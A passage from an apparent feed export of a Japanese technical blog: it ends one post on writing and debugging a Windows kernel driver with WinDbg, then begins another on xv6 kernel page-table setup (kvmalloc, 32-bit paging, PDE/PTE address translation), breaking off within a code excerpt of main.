    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 96.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAYAAACQjC21AAAACXBIWXMAAAsTAAALEwEAmpwYAAADfklEQVQ4y1VUy44iNxTlW7LJcr4hi/xdlMVEihQpUTSfMYtITTfh2VBV1NvlerseUBQ0dAMzPZo5uXYBPUG6cvnaPj73nmN6TbNDXTUQeQXGQoQ8UfP9bo+oaPFhXOCvYY7f7zO8v8vwWz+DFjV4ftqj3Txh2/4/eqvVBq4fQWMCMzfFo1/AKQ4I6wM+Ohv8/DfHT38yvHvv4IdfTPz4q4U/hiWSeg8z28HJu7ApXEGAL8/PSFOBdrtD27bYPB0RiTXCtISoWxRFiSwrcDqdcf19+gK8fP6G42s3XmN//ore6+sXbLcHZElM5QZYbzYoqwpRnGC1brBqGmSiQEXfTbvF4eWI4+mE7W6HzXaLl+OR4oT94UD5cwfYtntM5xb+6U8xmtkYzyw8DHUMpzblPQxGSwzGMgz0/9XVqOYjg/Y6GD86t7F3otvqusFCd9AfzDCRi1PaPNQw0zxoywBz3YducugWx9xgKmdYIQw7VPNHWp/rjPb76B2JsgQ09AXu7/uIqXTOXFiWhaoq0TQrNdZ1iVVdqXG9qlGIHEJkKAuBshSoKGpa752o/hUBuo6D2WyGJM1UL13Xp16WJEpBuRRplpE4GQmYIs9zRFFMERGBhIBztU+I8g1Q1xbo9/vgYQzmuTAME7kQSOiA7/tgQYA47kAksMy5rgvOOQJa4xSO670BOraFyWSi1OWBD9t2kRGTuq4VqAxpoYoc0JDyEpiH9BAosixVzIvyu5KXBik3GCCkUgLmwTRttamkTTFdIkvMMiqNLLSiHgYBp5fFVEhQTm0KePgGaBPDMTGUPYzCgOaOYiPLkwckwyiOVNkxgYcXdh0YV6PvszdA01xiOBophsx3MZ8vqOQMOQHKA4L6eRXkmpO9C0NOF0RKOHn2BmjoGtnmnpIJwoBhsdCUsvJwFEYXNpEqWxCoLFWJxXz1Hcn17wFdh17FdEY2SGmRE2MLgqxQlqUSIKG8LL+45TrFVRCYZBkQazJ2B6gt5ri7u1ON9Vwbo/FEbUhIEIc86nnehREj0ZiaS9t4ZLFu9GBR32+Ajm1jMp3eGC6XJv0p5IqNEoJC9kmy7Ix9aUPUCSPnLLgwlE/PXHa2kT6UPdQ1Q5WcU8+kAFfPKWBSnLHgZhvFms4oY5/Pn7Bet0qUh4cHdYvvOdA0nRglShRpB/9ykNO6BL2Kcg05l4D/AZt2VHCOZCKvAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/321e106c693079f7889192779df1e18a/8ac56/image-28.webp 240w,
/static/321e106c693079f7889192779df1e18a/ca1b5/image-28.webp 403w&quot;
              sizes=&quot;(max-width: 403px) 100vw, 403px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/321e106c693079f7889192779df1e18a/8ff5a/image-28.png 240w,
/static/321e106c693079f7889192779df1e18a/045fd/image-28.png 403w&quot;
            sizes=&quot;(max-width: 403px) 100vw, 403px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/321e106c693079f7889192779df1e18a/045fd/image-28.png&quot;
            alt=&quot;image-28.png&quot;
            title=&quot;image-28.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;クライアントアプリケーションでは、受け取った引数は以下のように&lt;code class=&quot;language-text&quot;&gt;atoi&lt;/code&gt;関数で数値化され、ドライバルーチンに渡されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;ThreadId &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;atoi&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
data&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Priority &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;atoi&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;argv&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;C++の&lt;code class=&quot;language-text&quot;&gt;atoi&lt;/code&gt;関数は文字列を4バイトの&lt;code class=&quot;language-text&quot;&gt;int&lt;/code&gt;型の数値に変換します。&lt;/p&gt;
&lt;p&gt;そのため、メモリに格納されているデータも4バイト単位のリトルエンディアン形式で読むのがよさそうです。&lt;/p&gt;
&lt;p&gt;上記より、入力バッファの参照先のメモリに保存されている値は、以下の通りクライアントアプリケーションに与えた引数と一致していることがわかりました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0x2148 = 8520
0x1F = 31&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;WinDbgを使うと、カーネルドライバに渡されたIRPの情報も簡単に参照できるので非常に便利ですね。&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;さて、これで最低限の機能をそろえたカーネルドライバの実装と、デバッグによるIRPの解析に入門することができました。&lt;/p&gt;
&lt;p&gt;まだまだ先は長いですが、引き続きカーネルプログラミングとデバッグは続けていこうと思います。&lt;/p&gt;
&lt;h2 id=&quot;参考書籍&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot; aria-label=&quot;参考書籍 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;参考書籍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3H3WMoe&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Windowsカーネルドライバプログラミング&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[xv6OSを真面目に読みこんでカーネルを完全に理解する -ページテーブル(PDT/PTD) 編-]]></title><description><![CDATA[教育用OSのxv6OSのソースコードを読んでカーネルについて学んでいきます。この記事ではxv6OSのカーネルのmain関数の挙動を読み解きます。]]></description><link>https://kashiwaba-yuki.com/unix-xv6-005-kernel-main-02</link><guid isPermaLink="false">https://kashiwaba-yuki.com/unix-xv6-005-kernel-main-02</guid><pubDate>Wed, 26 Jan 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;にインスパイアされて&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;を読んでます。&lt;/p&gt;
&lt;p&gt;UNIX V6自体はx86CPUでは動作しないため、基本的には、UNIXv6をX86アーキテクチャで動くようにした&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;のリポジトリをForkした&lt;a href=&quot;https://github.com/kash1064/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;kash1064/xv6-public: xv6 OS&lt;/a&gt;のソースコードを読んでいくことにしました。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/unix-xv6-004-kernel-main-01&quot;&gt;前回&lt;/a&gt;は&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数で初めに実行される&lt;code class=&quot;language-text&quot;&gt;kinit1&lt;/code&gt;関数による排他制御周りの挙動を確認しました。&lt;/p&gt;
&lt;p&gt;今回は&lt;code class=&quot;language-text&quot;&gt;kvmalloc&lt;/code&gt;関数によるxv6カーネルのページテーブルの初期化を追っていきます。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#32bit%E3%83%9A%E3%83%BC%E3%82%B8%E3%83%B3%E3%82%B0%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;32bitページングについて&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#pdt%E3%81%A8pt&quot;&gt;PDTとPT&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%BB%AE%E6%83%B3%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%81%8B%E3%82%89%E7%89%A9%E7%90%86%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%82%92%E5%8F%82%E7%85%A7%E3%81%99%E3%82%8B%E6%B5%81%E3%82%8C&quot;&gt;仮想アドレスから物理アドレスを参照する流れ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#kvmalloc%E9%96%A2%E6%95%B0&quot;&gt;kvmalloc関数&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%BB%AE%E6%83%B3%E3%83%A1%E3%83%A2%E3%83%AA%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;仮想メモリについて&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#setupkvm%E9%96%A2%E6%95%B0&quot;&gt;setupkvm関数&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#kalloc%E9%96%A2%E6%95%B0%E3%81%AB%E3%82%88%E3%82%8B%E3%83%9A%E3%83%BC%E3%82%B8%E3%81%AE%E7%A2%BA%E4%BF%9D&quot;&gt;kalloc関数によるページの確保&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%BB%AE%E6%83%B3%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%81%AEpte%E3%81%AE%E4%BD%9C%E6%88%90&quot;&gt;仮想アドレスのPTEの作成&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#freevm%E9%96%A2%E6%95%B0&quot;&gt;freevm関数&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#switchkvm%E9%96%A2%E6%95%B0&quot;&gt;switchkvm関数&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot;&gt;参考書籍&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;32bitページングについて&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#32bit%E3%83%9A%E3%83%BC%E3%82%B8%E3%83%B3%E3%82%B0%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;32bitページングについて permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;32bitページングについて&lt;/h2&gt;
&lt;p&gt;今回はxv6OSの&lt;code class=&quot;language-text&quot;&gt;kvmalloc&lt;/code&gt;関数から読んでいきます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kvmalloc&lt;/code&gt;関数はカーネルのページテーブルを作成する関数です。&lt;/p&gt;
&lt;p&gt;そのため、ソースコードを読む前に、32bit環境でのページング機構について整理しておきます。&lt;/p&gt;
&lt;p&gt;ページング機構はMMU(Memory Management Unit)によって実装されます。&lt;/p&gt;
&lt;p&gt;x86環境では、MMUはPD(ページングディレクトリ)とPT(ページングテーブル)を利用してメモリマップを行います。&lt;/p&gt;
&lt;h3 id=&quot;pdtとpt&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#pdt%E3%81%A8pt&quot; aria-label=&quot;pdtとpt permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;PDTとPT&lt;/h3&gt;
&lt;p&gt;PDTとPTにはそれぞれPDE(ページディレクトリエントリ)とPTE(ページテーブルエントリ)が含まれます。&lt;/p&gt;
&lt;p&gt;PDEとPTEはどちらも1つ当たり4バイト(32bit)のサイズであり、PDにはPDEが、PTにはPTEが、それぞれ1024個含まれます。&lt;/p&gt;
&lt;p&gt;これによってPDEとPTEはどちらも4KiBのサイズ(x86におけるデフォルトの1ページ分)になります。&lt;/p&gt;
&lt;p&gt;各エントリの詳細については以下のリンク先が参考になります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://wiki.osdev.org/Paging&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Paging - OSDev Wiki&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;仮想アドレスから物理アドレスを参照する流れ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E4%BB%AE%E6%83%B3%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%81%8B%E3%82%89%E7%89%A9%E7%90%86%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%82%92%E5%8F%82%E7%85%A7%E3%81%99%E3%82%8B%E6%B5%81%E3%82%8C&quot; aria-label=&quot;仮想アドレスから物理アドレスを参照する流れ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;仮想アドレスから物理アドレスを参照する流れ&lt;/h3&gt;
&lt;p&gt;仮想アドレスを物理アドレスに変換する際、仮想アドレスは以下の3つに分割されます。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;最上位10bit：PDEのインデックス&lt;/li&gt;
&lt;li&gt;次の10bit：PTEのインデックス&lt;/li&gt;
&lt;li&gt;最下位12bit：ページオフセット&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;アドレス変換の際、MMUはPDを参照して仮想アドレスのインデックスからPDEを特定します。&lt;/p&gt;
&lt;p&gt;次にPDEの情報と、仮想アドレスのインデックスからPTEを特定します。&lt;/p&gt;
&lt;p&gt;PTEは物理アドレスのベースアドレスを解決するため、仮想アドレスのオフセットと合わせて参照先の物理アドレスを特定することができます。&lt;/p&gt;
&lt;p&gt;詳細な流れは以下の図がわかりやすかったため引用しています。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/c4e6687bec1fc2e4b2022ecd1f666969/41099/zu04.jpg&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 61.24999999999999%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAMABQDASIAAhEBAxEB/8QAFwABAQEBAAAAAAAAAAAAAAAAAAECBf/EABUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAAHtXcgqv//EABgQAAMBAQAAAAAAAAAAAAAAAAABEQIQ/9oACAEBAAEFAuZdUIJQ/8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAwEBPwE//8QAFREBAQAAAAAAAAAAAAAAAAAAEBH/2gAIAQIBAT8Bp//EABgQAAIDAAAAAAAAAAAAAAAAAAABIDFB/9oACAEBAAY/AtLcf//EABsQAQADAAMBAAAAAAAAAAAAAAEAESExQVGB/9oACAEBAAE/IafR9iUblBuGIeZ21gCif//aAAwDAQACAAMAAAAQPM//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAEDAQE/ED//xAAWEQEBAQAAAAAAAAAAAAAAAAABEBH/2gAIAQIBAT8QVs//xAAaEAEBAQEBAQEAAAAAAAAAAAABEQAhMUFR/9oACAEBAAE/EAxtvyOZEYOrTdYgZ7vBDP0wR6B5F0AQ3//Z&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/c4e6687bec1fc2e4b2022ecd1f666969/8ac56/zu04.webp 240w,
/static/c4e6687bec1fc2e4b2022ecd1f666969/d3be9/zu04.webp 480w,
/static/c4e6687bec1fc2e4b2022ecd1f666969/b0a15/zu04.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/c4e6687bec1fc2e4b2022ecd1f666969/09b79/zu04.jpg 240w,
/static/c4e6687bec1fc2e4b2022ecd1f666969/7cc5e/zu04.jpg 480w,
/static/c4e6687bec1fc2e4b2022ecd1f666969/41099/zu04.jpg 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/jpeg&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/c4e6687bec1fc2e4b2022ecd1f666969/41099/zu04.jpg&quot;
            alt=&quot;img&quot;
            title=&quot;img&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参照画像：&lt;a href=&quot;https://xtech.nikkei.com/it/article/COLUMN/20071107/286632/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;第6回 メモリー上のデータを見えなくする（前編） | 日経クロステック（xTECH）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;PDは単なるPDEの配列形式になっています。&lt;/p&gt;
&lt;p&gt;PDの先頭アドレスはCR3レジスタに格納されています。&lt;/p&gt;
&lt;h2 id=&quot;kvmalloc関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#kvmalloc%E9%96%A2%E6%95%B0&quot; aria-label=&quot;kvmalloc関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;kvmalloc関数&lt;/h2&gt;
&lt;p&gt;さて、&lt;a href=&quot;/unix-xv6-004-kernel-main-01&quot;&gt;前回&lt;/a&gt;に引き続きカーネルの&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数の処理を追っていきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Bootstrap processor starts running C code here.&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// Allocate a real stack and switch to it, first&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// doing some setup required for memory allocator to work.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;kinit1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;end&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;P2V&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// phys page allocator&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;kvmalloc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// kernel page table&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;mpinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;// detect other processors&lt;/span&gt;
